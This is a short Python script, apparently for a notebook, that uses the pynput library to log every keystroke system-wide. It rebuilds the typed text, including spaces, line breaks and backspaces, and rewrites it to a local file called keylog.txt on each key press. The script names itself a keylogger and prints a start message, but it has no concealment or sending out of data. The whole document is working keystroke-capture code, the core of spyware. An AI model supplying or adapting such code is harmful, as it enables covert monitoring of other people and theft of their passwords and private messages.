from pynput.keyboard import Listener, Key

# Buffer to store the typed keys
typed_text = ""

# Function to handle key presses
def write_to_file(key):
    global typed_text

    try:
        # Add regular character
        typed_text += key.char
    except AttributeError:
        # Handle special keys
        if key == Key.space:
            typed_text += " "
        elif key == Key.enter:
            typed_text += "\n"
        elif key == Key.backspace:
            typed_text = typed_text[:-1]  # remove last char
        # Ignore other keys like shift, ctrl, etc.

    # Save to file
    with open("keylog.txt", "w") as f:
        f.write(typed_text)

# Start the keylogger
def start_keylogger():
    print("Keylogger started... Type something. Stop the cell to end.")
    with Listener(on_press=write_to_file) as listener:
        listener.join()

start_keylogger()